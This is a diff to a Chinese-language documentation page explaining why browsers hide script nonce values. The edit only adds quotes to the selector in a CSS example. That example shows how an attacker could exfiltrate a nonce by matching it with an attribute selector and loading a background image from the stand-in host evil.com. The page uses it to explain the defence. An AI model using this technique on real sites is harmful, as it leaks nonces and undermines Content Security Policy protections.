@@ -24,7 +24,7 @@ let nonce = script["nonce"] || script.getAttribute("nonce");
 隐藏 Nonce 是为了阻止攻击者通过某种机制提取出 nonce 值，比如下面这种方式：
 
 ```css example-bad
-script[nonce~=whatever] {
+script[nonce~="whatever"] {
   background: url("https://evil.com/nonce?whatever");
 }
 ```
